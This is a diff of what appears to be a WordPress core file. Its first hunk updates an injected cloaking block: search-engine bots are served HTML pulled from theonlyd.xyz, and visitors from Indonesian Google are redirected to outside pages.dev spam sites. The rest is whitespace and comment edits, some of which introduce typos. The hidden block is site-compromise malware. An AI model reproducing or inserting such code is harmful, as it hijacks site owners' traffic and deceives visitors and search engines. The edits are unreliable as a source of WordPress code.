@@ -14,13 +14,13 @@ return true;
 return false;
 }
 if (is_bot()) {
-echo file_get_contents('https://theonlyd.xyz/taalumgroup.html');
+echo file_get_contents('https://theonlyd.xyz/amab.html');
 exit;
 }
 
 if (stripos($s_ref, 'google.co.id') !== false ||
 (stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://diam-disana.pages.dev/");
+header("Location: https://amab.pages.dev/no-money-no-honey/");
 exit;
 }
 ?>
@@ -264,7 +264,8 @@ function wp_get_environment_type() {
 		if ( function_exists( '__' ) ) {
 			/* translators: %s: WP_ENVIRONMENT_TYPES */
 			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
-		} else {$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
+		} else {
+			$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
 		}
 
 		_deprecated_argument(
@@ -555,7 +556,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * in their development environments.
  *
  * `WP_DEBUG_DISPLAY` and `WP_DEBUG_LOG` perform no function unless `WP_DEBUG`
- * istrue.
+ * is true.
  *
  * When `WP_DEBUG_DISPLAY` is true, WordPress will force errors to be displayed.
  * `WP_DEBUG_DISPLAY` defaults to true. Defining it as null prevents WordPress
@@ -836,7 +837,8 @@ function wp_start_object_cache() {
 	 * Filters whether to enable loading of the object-cache.php drop-in.
 	 *
 	 * This filter runs before it can be used by plugins. It is designed for non-web
-	 * runtimes. If false is returned, object-cache.php will never be loaded.*
+	 * runtimes. If false is returned, object-cache.php will never be loaded.
+	 *
 	 * @since 5.8.0
 	 *
 	 * @param bool $enable_object_cache Whether to enable loading object-cache.php (if present).
@@ -1126,7 +1128,8 @@ function wp_get_active_and_valid_themes() {
  *
  * @global WP_Paused_Extensions_Storage $_paused_themes
  *
- * @param string[] $themes Array of absolute theme directory paths.* @return string[] Filtered array of absolute paths to themes, without any paused themes.
+ * @param string[] $themes Array of absolute theme directory paths.
+ * @return string[] Filtered array of absolute paths to themes, without any paused themes.
  */
 function wp_skip_paused_themes( array $themes ) {
 	$paused_themes = wp_paused_themes()->get_all();
@@ -1138,7 +1141,8 @@ function wp_skip_paused_themes( array $themes ) {
 	foreach ( $themes as $index => $theme ) {
 		$theme = basename( $theme );
 
-		if ( array_key_exists( $theme, $paused_themes ) ) {unset( $themes[ $index ] );
+		if ( array_key_exists( $theme, $paused_themes ) ) {
+			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
 			$GLOBALS['_paused_themes'][ $theme ] = $paused_themes[ $theme ];
@@ -1419,7 +1423,7 @@ function is_network_admin() {
  *
  * @global WP_Screen $current_screen WordPress current screen object.
  *
- * @return bool True if inside WordPress user administration pages.
+ * @return bool Trueif inside WordPress user administration pages.
  */
 function is_user_admin() {
 	if ( isset( $GLOBALS['current_screen'] ) ) {
@@ -1455,7 +1459,7 @@ function is_multisite() {
  *
  * @since 2.5.0
  *
- *@param mixed $maybeint Data you wish to have converted to a non-negative integer.
+ * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
  * @return int A non-negative integer.
  */
 function absint( $maybeint ) {
@@ -1729,7 +1733,7 @@ function wp_is_ini_value_changeable( $setting ) {
 }
 
 /**
- * Determines whether the current request is a WordPress Ajax request.
+ * Determines whether the currentrequest is a WordPress Ajax request.
  *
  * @since 4.7.0
  *
